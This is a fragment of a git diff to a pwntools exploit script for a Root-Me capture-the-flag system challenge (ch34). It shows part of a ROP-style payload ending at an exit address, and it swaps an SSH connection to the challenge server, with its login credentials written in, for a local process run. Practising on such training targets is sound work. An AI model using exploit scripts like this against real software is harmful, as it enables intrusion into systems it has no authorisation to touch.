@@ -85,8 +85,7 @@ payload+=p64(0x0000000004075B0)  # address of exit
 
 
 # SHELLY 
-s = ssh(host='challenge03.root-me.org',password="app-systeme-ch34",port=2223,user="app-systeme-ch34") 
-process = s.process("ch34")
+process = process("ch34")
 
 process.sendline(payload)
 process.recvline()
